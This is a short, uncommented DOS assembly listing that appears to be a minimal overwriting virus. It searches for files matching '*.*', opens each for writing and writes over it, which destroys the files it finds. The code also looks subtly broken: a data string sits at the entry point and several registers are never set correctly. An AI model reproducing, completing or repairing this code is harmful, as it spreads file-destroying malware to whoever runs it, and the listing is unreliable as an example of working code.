   model tiny
   codeseg
   org     100h
   start:
   db     '*.*',0
   mov    ah,4eh
   mov    cl,20h
   write:
   mov    dx,si
   int    21h
   mov    ax,3d02h
   mov    dx,9eh
   int    21h
   xchg   ax,bx
   mov    ah,40h
   jmp    write
   end    start
